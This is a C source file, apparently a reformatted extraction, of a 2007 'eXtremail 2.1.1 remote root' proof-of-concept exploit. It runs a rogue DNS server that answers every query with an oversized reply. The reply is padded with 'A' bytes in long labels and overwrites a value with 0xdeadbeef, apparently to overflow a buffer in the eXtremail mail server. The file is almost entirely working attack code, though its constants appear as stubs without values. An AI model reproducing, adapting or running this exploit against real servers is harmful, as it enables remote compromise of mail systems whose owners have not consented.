#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  DNS_HDR_LEN ; 
 int DNS_MAX_MSG ; 
 int DNS_PORT ; 
 int /*<<< orphan*/  DNS_TRAIL_LEN ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 int HAMMER_LEN ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 int bind (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  dns_hdr_buf ; 
 int /*<<< orphan*/  dns_trail_buf ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  htonl (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  htons (int) ; 
 char* inet_ntoa (TYPE_1__) ; 
 int /*<<< orphan*/  memcpy (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int ntohs (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int recvfrom (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int*) ; 
 int sendto (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

int
main (int argc, char *argv[])
{
  int sock, result;
  struct sockaddr_in cliaddr, servaddr;

  printf ("eXtremail 2.1.1 remote root POC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  sock = socket (AF_INET, SOCK_DGRAM, 0);
  if (sock < 0)
    {
      perror ("socket()");
      exit (EXIT_FAILURE);
    }

  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htonl (INADDR_ANY);
  servaddr.sin_port = htons (DNS_PORT);
  result = bind (sock, (struct sockaddr *) &servaddr, sizeof servaddr);
  if (result < 0)
    {
      perror ("bind()");
      exit (EXIT_FAILURE);
    }

  printf ("+Waiting for data on port %d...\n", DNS_PORT);

  while (1)
    {
      int n, clilen, curlen, len;
      char rbuf[DNS_MAX_MSG], sbuf[DNS_MAX_MSG*4];
      char *ptr;

      memset (rbuf, 0, sizeof rbuf);
      memset (sbuf, 0, sizeof sbuf);

      /* receive message */
      clilen = sizeof cliaddr;
      n = recvfrom (sock, rbuf, DNS_MAX_MSG, 0, (struct sockaddr *) &cliaddr, &clilen);

      if (n < 0)
        {
          printf ("- cannot receive data!\n");
          continue;
        }

      /* print received message */
      printf ("+ Connection from %s: %u\n",
              inet_ntoa (cliaddr.sin_addr),
              ntohs (cliaddr.sin_port));

      /* formulate reply */
      ptr = sbuf;
      memcpy (ptr, dns_hdr_buf, DNS_HDR_LEN);
      ptr += DNS_HDR_LEN;

      for (len = 0; len < HAMMER_LEN; ptr += curlen)
      {
        if (len + 63 > HAMMER_LEN)
          curlen = HAMMER_LEN - len;
        else
          curlen = 63;

        len += curlen;
        *ptr++ = curlen;
        memset (ptr, 0x41, curlen);
      }

      *((unsigned long *)(ptr - 4)) = 0xdeadbeef;
      *ptr++ = 0x00;
      memcpy (ptr, dns_trail_buf, DNS_TRAIL_LEN);
      ptr += DNS_TRAIL_LEN;

      n = sendto (sock, sbuf, ptr-sbuf, 0, (struct sockaddr *) &cliaddr, clilen);
    }

  return (EXIT_SUCCESS);
}